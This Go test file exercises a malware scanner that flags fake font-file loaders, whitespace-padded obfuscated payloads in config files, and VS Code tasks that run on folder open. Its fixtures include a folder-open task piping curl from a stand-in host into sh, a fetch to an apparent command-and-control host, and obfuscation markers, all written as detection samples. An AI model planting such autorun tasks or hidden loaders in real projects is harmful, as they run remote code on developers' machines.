package scanner

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Look-alike payloads: the same shape as the 2026 worm variants, but inert.
var (
	tabs           = strings.Repeat("\t", 60)
	fakeFontBody   = "global['!']='9-8463-11';var _0x42d753=_0xdd5b;(function(){console.log('x')})();\n"
	folderOpenTask = `{
  "version": "2.0.0",
  "tasks": [{
    "label": "eslint-check",
    "type": "shell",
    "command": "node ./public/fonts/fa-solid-300.llf",
    "runOptions": { "runOn": "folderOpen" }
  }]
}`
	curlTask = `{"tasks":[{"label":"env","type":"shell",
 "linux":{"command":"curl https://example.invalid/settings/linux?flag=9 | sh"},
 "runOptions":{"runOn":"folderOpen"}}]}`
	benignTask = `{"tasks":[{"label":"watch","type":"npm","script":"watch","runOptions":{"runOn":"folderOpen"}}]}`
)

func hasSig(fs []Finding, id string) bool {
	for _, f := range fs {
		if f.SignatureID == id {
			return true
		}
	}
	return false
}

func TestFakeFontsAreHighInAnyFolderAndExtension(t *testing.T) {
	e := newTestEngine(t)
	for _, p := range []string{
		"public/fonts/fa-solid-400.woff2",
		"src/pages/Dashboard/components/public/fonts/fa-solid-900.woff2",
		"public/fonts/fa-solid-300.llf",
		"public/fonts/fa-solid-600.eot",
	} {
		fs := e.ScanBytes(p, []byte(fakeFontBody))
		if !hasSig(fs, "fake-font-loader") || e.Severity(fs) != High {
			t.Errorf("%s: expected HIGH fake-font-loader, got %+v", p, fs)
		}
	}
	// whitespace-padded variant (fa-solid-600.eot starts with blank space)
	fs := e.ScanBytes("public/fonts/fa-solid-600.eot", []byte(strings.Repeat(" ", 300)+fakeFontBody))
	if !hasSig(fs, "fake-font-loader") {
		t.Errorf("padded fake .eot not detected: %+v", fs)
	}
}

func TestRealFontsAreClean(t *testing.T) {
	e := newTestEngine(t)
	woff2 := append([]byte("wOF2\x00\x01\x00\x00"), []byte("function require( global[ _0xabcd")...)
	eot := make([]byte, 64)
	eot[34], eot[35] = 0x4C, 0x50
	copy(eot[40:], "function global[")
	binaryNoise := []byte{0x00, 0x01, 0x02, 0xff, 0xfe, '=', '>', 'f', 'u', 'n', 'c', 't', 'i', 'o', 'n', 0x00, 0x9c}
	for name, body := range map[string][]byte{
		"public/fonts/fa-solid-900.woff2": woff2,
		"public/fonts/fa-brands-400.eot":  eot,
		"assets/fonts/icons.ttf":          binaryNoise,
	} {
		if fs := e.ScanBytes(name, body); len(fs) != 0 {
			t.Errorf("%s: real font flagged: %+v", name, fs)
		}
	}
}

func TestVSCodeAutorunTask(t *testing.T) {
	e := newTestEngine(t)
	for name, body := range map[string]string{"node font loader": folderOpenTask, "curl pipe shell": curlTask} {
		fs := e.ScanBytes(".vscode/tasks.json", []byte(body))
		if !hasSig(fs, "vscode-autorun-loader-task") || e.Severity(fs) != High {
			t.Errorf("%s: expected HIGH vscode-autorun-loader-task, got %+v", name, fs)
		}
	}
	if fs := e.ScanBytes("apps/web/.vscode/tasks.json", []byte(benignTask)); len(fs) != 0 {
		t.Errorf("benign folder-open watch task flagged: %+v", fs)
	}
}

func TestVSCodeAutomaticTasksSetting(t *testing.T) {
	e := newTestEngine(t)
	fs := e.ScanBytes(".vscode/settings.json", []byte(`{ "task.allowAutomaticTasks": "on" }`))
	if !hasSig(fs, "vscode-auto-tasks-enabled") || e.Severity(fs) != Moderate {
		t.Errorf("expected MODERATE vscode-auto-tasks-enabled, got %+v", fs)
	}
	if fs := e.ScanBytes(".vscode/settings.json", []byte(`{ "task.allowAutomaticTasks": "off" }`)); len(fs) != 0 {
		t.Errorf("safe setting flagged: %+v", fs)
	}
}

func TestMarkerVariantsInConfigsAreHigh(t *testing.T) {
	e := newTestEngine(t)
	for name, payload := range map[string]string{
		"spaced global.i":     "global.i = 'A8-1144-1';x()",
		"short A8 id":         "global.i = 'A8-7753';const _0x10df86=_0x4925;",
		"A9 family":           `global.i="A9-8463-11";x()`,
		"other global['!']":   "global['!']='8-2299-15';x()",
		"_t_ runtime global":  "global['_t_s']=1;",
		"string table only":   "const a=_0x4925;",
		"c2 host in a config": "fetch('https://260120.vercel.app/settings')",
	} {
		src := "export default { plugins: {} };" + tabs + payload + "\n"
		fs := e.ScanBytes("apps/web/postcss.config.mjs", []byte(src))
		if e.Severity(fs) != High {
			t.Errorf("%s: expected HIGH, got %s %+v", name, e.Severity(fs), fs)
		}
	}
}

func TestViteConfigIsATarget(t *testing.T) {
	if !IsScanTarget("frontend/vite.config.js", false) {
		t.Fatal("vite.config.js should be scanned")
	}
}

func TestDeepScansNestedScriptsOnlyForMarkedHiddenPayloads(t *testing.T) {
	e := newTestEngine(t)
	e.Deep = true
	infected := "router.get('/', h);" + tabs + "global.i='A8-1144-1';const _0x10df86=_0x4925;\n"
	fs := e.ScanBytes("routes/admin.js", []byte(infected))
	if !hasSig(fs, "hidden-whitespace-payload") || e.Severity(fs) != High {
		t.Errorf("nested infected script: expected HIGH hidden-whitespace-payload, got %+v", fs)
	}
	minified := "var a=1;" + strings.Repeat(" ", 30) + "new Function('return 1')();\n"
	if fs := e.ScanBytes("static/js/chunk.js", []byte(minified)); len(fs) != 0 {
		t.Errorf("minified bundle without campaign marker flagged: %+v", fs)
	}
	mention := "// Windows: run config.bat to set up\nmodule.exports = 1;\n"
	if fs := e.ScanBytes("scripts/setup/notes.js", []byte(mention)); len(fs) != 0 {
		t.Errorf("plain string signatures must not apply to arbitrary nested scripts: %+v", fs)
	}
	e.Deep = false
	if IsScanTarget("routes/admin.js", false) {
		t.Error("nested scripts must only be scanned with --deep")
	}
}

func TestVendoredFoldersAreSkippedForFontsAndDeep(t *testing.T) {
	for _, p := range []string{"node_modules/pkg/fonts/a.woff2", "dist/fonts/a.woff2"} {
		if IsScanTarget(p, true) {
			t.Errorf("%s should be skipped", p)
		}
	}
	if IsScanTarget("node_modules/pkg/lib/index.js", true) {
		t.Error("node_modules scripts should be skipped in --deep")
	}
}

func TestScanDirFindsNestedFakeFontAndTask(t *testing.T) {
	root := t.TempDir()
	write := func(rel, body string) {
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("src/app/products/[id]/public/fonts/fa-solid-900.woff2", fakeFontBody)
	write(".vscode/tasks.json", folderOpenTask)
	write("postcss.config.mjs", "export default {};\n")

	res, err := newTestEngine(t).ScanDir(root)
	if err != nil {
		t.Fatalf("ScanDir: %v", err)
	}
	if res.Severity != High || len(res.Files) != 2 {
		t.Fatalf("expected HIGH with 2 infected files, got %s %+v", res.Severity, res.Files)
	}
}
